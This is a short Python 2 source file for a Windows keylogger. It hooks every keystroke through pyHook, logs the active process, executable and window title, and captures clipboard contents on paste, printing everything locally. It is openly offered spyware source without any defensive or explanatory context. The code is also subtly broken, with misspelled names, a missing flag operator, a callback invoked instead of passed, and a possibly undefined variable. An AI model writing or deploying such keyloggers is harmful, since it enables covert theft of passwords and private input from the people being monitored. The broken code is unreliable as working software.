from ctypes import *
import pyhook
import pythoncom
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
	
	#get handle to foreground window
	handlewind = user32.GetForegroundWindow()
	
	#get process id pid 
	pid = c_ulong(0)
	usser32.GetWindowThreadProcessId(handlewind, byref(pid))
	
	#store the current pid
	process_id = "%d" %pid.value
	
	#get the executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 0x10, False,pid)
	psapi.getModuleBaseName(h_process,None,byref(executable),512)
	#read the title
	window_tile = create_string_buffer("\x00"*512)
	length = user32.GetWindowTextA(handlewind,byref(window_tile),512)
	#print header if correct process
	print
	print "[PID:%s-%s-%s]" %(process_id,executable.value,window_.title.value)
	print

	#close the handles
	kernel32.CloseHandle(handlewind)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window
	#check if target window changed
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()
		#if printable ASCII char event
		if event.Ascii > 32 and event.Ascii < 127:
			print chr(event.Ascii)
		else:
			#grab clipboard content
			if event.Key == "V":
				win32clipboard.OpenClipboard()
				pasted_value = win32clipboard.GetClipboardData()
				win32clipboard.CloseClipboard()
				print "[PASTE] - %s" %(pasted_value)
			else:
				print "[%s]" %(pasted_value)

	#Pass execution to the next hook registered
	return True

kl = pyhook.HookManager()
kl.KeyDown = KeyStroke()
#Register the hook and execute
kl.HookKeyboard()
pythoncom.PumpMessages()
	

